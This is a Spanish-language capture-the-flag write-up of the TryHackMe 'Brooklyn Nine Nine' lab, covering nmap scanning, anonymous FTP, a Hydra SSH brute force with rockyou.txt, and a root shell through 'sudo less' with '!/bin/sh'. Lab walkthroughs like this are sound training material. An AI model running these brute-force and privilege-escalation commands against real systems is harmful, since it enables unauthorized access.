---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - FTP
  - HTTP
  - FuzzingWeb
  - Hydra
  - SSH
  - PrivilegeEscalation
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#FTP|FTP]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Hydra|Hydra]]
	- [[#Explotación#SSH|SSH]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]

---
# Resolviendo la máquina Brooklyn Nine Nine

>En esta publicación, comparto cómo resolví la máquina **Brooklyn Nine Nine** de [TryHackMe](https://tryhackme.com/room/brooklynninenine).

---
## Enumeración
### Ping

`ping -c 1 10.10.32.108`

![[Pasted image 20250803184053.png]]

*TTL=63/64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.32.108 -oG allPorts`

![[Pasted image 20250803184325.png]]

`nmap -p21,22,80 -sCV 10.10.32.108 -oN targeted`

![[Pasted image 20250803184345.png]]
### FTP

Se observa que el servicio **FTP** (puerto 21) se encuentra abierto y con el inicio de sesión anónimo activado.

`ftp 10.10.32.108`

![[Pasted image 20250803184633.png]]

`ls`

![[Pasted image 20250803184656.png]]

Se identifica el archivo `note_to_jake.txt`, el cual se descarga para su análisis.

`get note_to_jake.txt`

`cat note_to_jake.txt`

![[Pasted image 20250803184849.png]]

Se encuentra el usuario `jake`, que le están pidiendo cambiar la contraseña.
### HTTP

`http://10.10.32.108/`

![[Pasted image 20250803185000.png]]
#### Fuzzing Web

`dirb http://10.10.32.108`

![[Pasted image 20250803185120.png]]

---
## Explotación
### Hydra

Se realiza un ataque de fuerza bruta sobre el usuario `jake`, utilizando el diccionario `rockyou.txt`.

`hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.32.108 -t 64`

![[Pasted image 20250803185533.png]]

Se obtiene la contraseña `987654321` correspondiente al usuario `jake`.
### SSH

Se accede al servicio **SSH** (puerto 22) con el usuario y contraseña obtenidos anteriormente.

`ssh jake@10.10.32.108`

![[Pasted image 20250803185714.png]]
### Escalada de Privilegios
#### Sudo

`sudo -l`

![[Pasted image 20250803185822.png]]

Se detecta que el usuario puede ejecutar `/usr/bin/less` como superusuario. Según [GTFOBins](https://gtfobins.github.io/gtfobins/less/#sudo), este binario puede ser explotado para obtener una shell con privilegios elevados.

![[Pasted image 20250803190025.png]]

```bash
sudo less /etc/profile
!/bin/sh
```

![[Pasted image 20250803190128.png]]

---